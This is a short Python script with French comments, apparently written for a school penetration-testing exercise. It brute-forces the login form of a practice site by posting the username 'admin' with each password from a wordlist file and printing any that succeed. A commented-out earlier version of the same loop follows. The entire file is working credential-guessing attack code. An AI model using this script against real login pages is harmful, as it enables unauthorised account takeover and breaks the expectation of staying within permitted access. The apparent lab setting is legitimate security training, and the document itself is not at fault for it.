#!/usr/bin/python3

import requests

# URL de la page de connexion
url = "http://pentest-isima.fr/Epreuves_Web/epreuve5/index.php"

# Identifiant de l'utilisateur
username = "admin"

# Parcourir la liste de mots de passe
with open("dico.txt", "r") as f:

    for password in f:
        # Envoyer une requête de connexion avec les informations d'identification
        response = requests.post(url, data={"login": username, "passwd": password})
        
        data = {"login": username, "passwd": password[:-1], "form": "1"}
        # print(data)
        # Envoi de la demande POST pour soumettre le formulaire
        response = requests.post(url, data=data)

        if not("Erreur d'identification" in response.text):
            print(f"Succès de l'identification pour {username}:{password}")



# # Parcourir la liste de mots de passe
# for password in passwords:
#     # Envoyer une requête de connexion avec les informations d'identification
#     response = requests.post(url, data={"username": username, "password": password})
#     # Vérifier si la connexion a réussi
#     if "Connexion réussie" in response.text:
#         # Le mot de passe correct a été trouvé, afficher un message et quitter la boucle
#         print(f"Le mot de passe est {password}")
#         break
#     else:
#         # Le mot de passe est incorrect, continuer à essayer les autres mots de passe
#         print(f"Le mot de passe {password} est incorrect")
